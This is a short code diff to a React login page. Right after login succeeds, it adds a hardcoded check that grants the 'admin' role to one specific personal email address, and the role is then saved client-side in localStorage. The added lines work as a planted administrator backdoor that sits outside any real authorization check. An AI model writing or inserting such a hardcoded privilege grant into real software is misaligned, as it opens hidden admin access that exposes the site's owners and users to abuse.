@@ -33,6 +33,10 @@ const Page: React.FC = () => {
       const user = await login(data);
 
       if (!user) throw new Error("Usuário não encontrado");
+      
+      if (user.email === 'fernandotrindade@gmail.com') {
+        user.role = 'admin'
+      }
 
       setUser(user);
       localStorage.setItem("user", JSON.stringify(user));
